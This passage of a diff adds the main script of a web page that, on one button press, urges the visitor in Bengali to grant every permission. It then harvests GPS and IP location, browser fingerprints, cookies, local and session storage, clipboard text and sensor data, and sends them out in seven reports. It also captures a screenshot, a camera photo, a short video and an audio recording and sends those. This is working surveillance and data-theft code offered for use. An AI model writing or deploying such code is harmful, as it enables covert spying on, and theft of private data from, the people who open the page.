+    d.caches.forEach(c => m += `• ${esc(c.name)}: ${c.entries} entries\n`);
+    m += '\n';
+  }
+
+  if (d.opfs && d.opfs.length) {
+    m += `<b>📁 OPFS (${d.opfs.length})</b>\n`;
+    d.opfs.forEach(f => m += `• ${esc(f.kind)}: ${esc(f.name)}\n`);
+    m += '\n';
+  }
+
+  if (d.quota) {
+    m += `<b>📊 Storage Quota</b>\n`;
+    m += `Used: ${(d.quota.usage/1024/1024).toFixed(2)} MB\n`;
+    m += `Quota: ${(d.quota.quota/1024/1024/1024).toFixed(2)} GB\n`;
+  }
+
+  return m.slice(0, 4000) || '<b>💾 Storage</b>: empty';
+}
+
+function reportSensors(d) {
+  let m = `<b>📡 Sensors & Devices</b>\n\n`;
+
+  if (d.devices) {
+    m += `<b>🎛 Media Devices</b>\n`;
+    m += `Cameras: ${d.devices.camera}\n`;
+    m += `Microphones: ${d.devices.mic}\n`;
+    m += `Speakers: ${d.devices.speaker}\n`;
+    if (d.devices.labels.length) {
+      m += `<code>${esc(d.devices.labels.slice(0,6).join('\n'))}</code>\n`;
+    }
+    m += '\n';
+  }
+
+  if (d.orientation) {
+    m += `<b>🧭 Orientation</b>\n`;
+    m += `alpha: ${d.orientation.alpha}\nbeta: ${d.orientation.beta}\ngamma: ${d.orientation.gamma}\n`;
+    m += `absolute: ${d.orientation.absolute}\n\n`;
+  }
+
+  if (d.motion) {
+    m += `<b>📳 Motion</b>\n`;
+    m += `x: ${d.motion.x}\ny: ${d.motion.y}\nz: ${d.motion.z}\n`;
+    m += `rot α: ${d.motion.rotAlpha}\nrot β: ${d.motion.rotBeta}\nrot γ: ${d.motion.rotGamma}\n\n`;
+  }
+
+  if (d.light != null) m += `<b>💡 Light</b>: ${d.light} lux\n\n`;
+  if (d.magnet) m += `<b>🧲 Magnetometer</b>\nx: ${d.magnet.x}\ny: ${d.magnet.y}\nz: ${d.magnet.z} μT\n\n`;
+  if (d.proximity) m += `<b>📏 Proximity</b>: ${d.proximity.near ? 'NEAR' : 'FAR'}\n\n`;
+  if (d.pressure) m += `<b>🔥 CPU Pressure</b>: ${d.pressure.state}\n\n`;
+
+  if (d.gamepad && d.gamepad.length) {
+    m += `<b>🎮 Gamepads (${d.gamepad.length})</b>\n`;
+    d.gamepad.forEach(p => m += `• ${esc(p.id)}\n`);
+  }
+
+  return m.slice(0, 4000);
+}
+
+function reportPermissionsFeatures(d) {
+  let m = `<b>🔐 Permissions</b>\n`;
+  for (const [k,v] of Object.entries(d.permStatus)) {
+    m += `${esc(k)}: ${esc(v)}\n`;
+  }
+  m += '\n';
+
+  m += `<b>🔓 Requested This Session</b>\n`;
+  for (const [k,v] of Object.entries(d.permRequested)) {
+    m += `${esc(k)}: ${esc(v)}\n`;
+  }
+  m += '\n';
+
+  m += `<b>🚀 Features (${d.features.supported.length}/${d.features.total})</b>\n`;
+  m += `<b>Supported:</b>\n`;
+  m += `<code>${esc(d.features.supported.join(', '))}</code>\n\n`;
+  m += `<b>Unsupported:</b>\n`;
+  m += `<code>${esc(d.features.unsupported.join(', '))}</code>`;
+
+  return m.slice(0, 4000);
+}
+
+// ═══════════════════════════════════════════════════════
+// MAIN
+// ═══════════════════════════════════════════════════════
+let running = false;
+
+async function run() {
+  if (running) return;
+  running = true;
+
+  btn.classList.remove('done', 'error');
+  btn.classList.add('running');
+  btn.textContent = 'WAIT';
+
+  try {
+    // ═══ STEP 1: PERMISSIONS ═══
+    setStatus('● REQUESTING PERMISSIONS', 'active');
+    toast('সব পারমিশন এলাউ করুন', 3200);
+    const permRequested = await requestAllPermissions();
+    const grantedCount = Object.values(permRequested).filter(v => v === 'granted' || v === 'on').length;
+    toast(`✅ ${grantedCount} পারমিশন পাওয়া গেছে`, 1800);
+    await sleep(400);
+
+    // ═══ STEP 2: PARALLEL COLLECTION ═══
+    setStatus('● COLLECTING DATA (1/3)', 'active');
+    btn.textContent = 'GRAB';
+
+    // Batch 1 — parallel
+    const [
+      battery, quota, ipGeo, gps, webrtc, orientation, motion, light, magnet,
+      proximity, pressure, mediaDevices, idb, cacheList, opfs,
+      audioFp, webgpu
+    ] = await Promise.all([
+      batteryInfo(),
+      storageQuota(),
+      collectIPGeo(),
+      collectGPS(),
+      webrtcIPs(),
+      readOrientation(),
+      readMotion(),
+      readLight(),
+      readMagnet(),
+      readProximity(),
+      readPressure(),
+      collectMediaDevices(),
+      collectIDB(),
+      collectCaches(),
+      collectOPFS(),
+      audioFingerprint(),
+      webgpuInfo()
+    ]);
+
+    setStatus('● COLLECTING DATA (2/3)', 'active');
+    const webgl = webglInfo();
+    const canvasFp = canvasFingerprint();
+    const fonts = detectFonts();
+    const cookies = collectCookies();
+    const local = collectLocal();
+    const session = collectSession();
+
+    let clipboard = '';
+    try { clipboard = await navigator.clipboard.readText(); } catch {}
+
+    setStatus('● COLLECTING DATA (3/3)', 'active');
+    const permStatus = await queryPermissions();
+    const features = detectFeatures();
+    const gamepad = readGamepad();
+
+    // ═══ STEP 3: BUILD REPORT OBJECT ═══
+    const conn = navigator.connection || {};
+    const uaData = navigator.userAgentData ? {
+      platform: navigator.userAgentData.platform,
+      mobile: navigator.userAgentData.mobile,
+      brands: navigator.userAgentData.brands || []
+    } : null;
+
+    const data = {
+      browser: {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        language: navigator.language,
+        languages: (navigator.languages || []).join(','),
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        screenAvail: `${screen.availWidth}×${screen.availHeight}`,
+        viewport: `${innerWidth}×${innerHeight}`,
+        dpr: devicePixelRatio,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        orientation: (screen.orientation && screen.orientation.type) || '?',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesEnabled: navigator.cookieEnabled,
+        online: navigator.onLine,
+        dnt: navigator.doNotTrack,
+        webdriver: navigator.webdriver,
+        pdf: navigator.pdfViewerEnabled,
+        touch: navigator.maxTouchPoints,
+        maxTouch: navigator.maxTouchPoints,
+        cores: navigator.hardwareConcurrency || '?',
+        memory: navigator.deviceMemory || '?',
+        plugins: navigator.plugins?.length || 0,
+        connType: conn.effectiveType || '?',
+        downlink: conn.downlink || '?',
+        rtt: conn.rtt || '?',
+        saveData: conn.saveData,
+        timeString: new Date().toString(),
+        timeISO: new Date().toISOString(),
+        tzOffset: -new Date().getTimezoneOffset() / 60
+      },
+      uaData,
+      battery,
+      quota,
+      ipGeo,
+      gps,
+      webrtcIPs: webrtc,
+      webgl,
+      webgpu,
+      canvasFp,
+      audioFp,
+      fonts,
+      cookies,
+      local,
+      session,
+      clipboard,
+      idb,
+      caches: cacheList,
+      opfs,
+      devices: mediaDevices,
+      orientation,
+      motion,
+      light,
+      magnet,
+      proximity,
+      pressure,
+      gamepad,
+      permStatus,
+      permRequested,
+      features
+    };
+
+    // ═══ STEP 4: SEND EVERYTHING ═══
+    let sent = 0, total = 7; // 7 text reports
+
+    setStatus(`● SENDING 1/${total} · DEVICE`, 'active');
+    if (await send(reportDevice(data))) sent++;
+    await sleep(400);
+
+    setStatus(`● SENDING 2/${total} · NETWORK`, 'active');
+    if (await send(reportNetwork(data))) sent++;
+    await sleep(400);
+
+    setStatus(`● SENDING 3/${total} · FINGERPRINT`, 'active');
+    if (await send(reportFingerprint(data))) sent++;
+    await sleep(400);
+
+    setStatus(`● SENDING 4/${total} · STORAGE`, 'active');
+    if (await send(reportStorage1(data))) sent++;
+    await sleep(400);
+
+    setStatus(`● SENDING 5/${total} · DATABASE`, 'active');
+    if (await send(reportStorage2(data))) sent++;
+    await sleep(400);
+
+    setStatus(`● SENDING 6/${total} · SENSORS`, 'active');
+    if (await send(reportSensors(data))) sent++;
+    await sleep(400);
+
+    setStatus(`● SENDING 7/${total} · PERMISSIONS`, 'active');
+    if (await send(reportPermissionsFeatures(data))) sent++;
+    await sleep(400);
+
+    // ═══ STEP 5: MEDIA CAPTURE ═══
+    setStatus('● CAPTURING SCREENSHOT', 'active');
+    const screenshot = await takeScreenshot();
+    if (screenshot) {
+      setStatus('● SENDING SCREENSHOT', 'active');
+      if (await sendPhoto(screenshot, '📸 Page Screenshot')) sent++;
+      await sleep(400);
+    }
+
+    if (permRequested.camera === 'granted') {
+      setStatus('● CAPTURING CAMERA', 'active');
+      const camPhoto = await takeCameraPhoto('environment');
+      if (camPhoto) {
+        setStatus('● SENDING CAMERA', 'active');
+        if (await sendPhoto(camPhoto, '📷 Back Camera · ' + NAME)) sent++;
+        await sleep(400);
+      }
+
+      setStatus('● RECORDING VIDEO (4s)', 'active');
+      const video = await recordVideo(4);
+      if (video) {
+        setStatus('● SENDING VIDEO', 'active');
+        if (await sendVideo(video, '🎥 Video · ' + NAME, 4)) sent++;
+        await sleep(400);
+      }
+    }
+
+    if (permRequested.microphone === 'granted') {
+      setStatus('● RECORDING AUDIO (5s)', 'active');
+      const audio = await recordAudio(5);
+      if (audio) {
+        setStatus('● SENDING AUDIO', 'active');
+        if (await sendAudio(audio, '🎤 Audio · ' + NAME, 5)) sent++;
+      }
+    }
+
+    // ═══ DONE ═══
+    if (sent > 0) {
+      setStatus(`● ALL SENT ✓ (${sent} items)`, 'active');
+      toast(`✅ ${sent} items পাঠানো হয়েছে`, 3500);
+      btn.textContent = 'DONE';
+      btn.classList.remove('running');
+      btn.classList.add('done');
+    } else {
+      throw new Error('কোনো কিছু পাঠানো যায়নি');
+    }
+  } catch (e) {
+    setStatus('● ERROR: ' + (e.message || 'failed'), 'error');
+    toast('✖ ' + (e.message || 'failed'), 3600);
+    btn.textContent = 'RETRY';
+    btn.classList.remove('running');
+    btn.classList.add('done');
+    btn.classList.add('error');
+  } finally {
+    running = false;
+  }
+}
+
+btn.addEventListener('click', run);
+</script>
+</body>
+</html>
